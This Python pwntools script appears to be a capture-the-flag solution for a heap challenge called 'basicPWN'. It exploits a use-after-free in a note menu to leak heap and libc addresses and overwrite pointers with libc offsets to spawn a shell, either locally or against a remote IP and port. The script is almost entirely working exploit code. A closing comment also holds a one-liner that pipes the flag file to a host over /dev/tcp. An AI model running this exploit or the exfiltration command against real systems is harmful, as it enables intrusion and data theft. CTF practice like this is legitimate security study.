from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./basicPWN_patched")
    if args.GDB:
        gdb.attach(r,"set max-visualize-chunk-size 0x50")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

#leak("libc",hex(libc))
'''
Pwn3d by pwn2ooown
'''
def add(size, data):
    sla("option", "1\n")
    sla("time", str(size))
    sa("note", data)
def show(idx):
    sla("option", "2\n")
    sla("ID", str(idx))
def free(idx):
    sla("option", "3\n")
    sla("ID", str(idx))

add(5,"777") #0
free(0)
add(5,"A") #1
show(0)
ru("Content : A")
ooo = u32(r.recv(4))
heap_base = ooo * 0x100000+0x1f000 # 1/256
print(hex(heap_base)) # no need I just lazy to delete it
free(0)
add(0x420,"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB") #2
free(2)
add(0x420,"C")#3
show(2)
ru("Content : ")
libc = u64(r.recv(6).ljust(8,b"\x00")) - 0x21ac43
leak("libc",hex(libc))
add(5,"A") #4
free(0)
free(4)
add(0x40,"EEEE") #5
# free(4)
add(0x10,p64(libc+0x50d70)+p64(libc+0x1d8678)) #UAF
show(0)
r.interactive()

'''
Writeup:
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''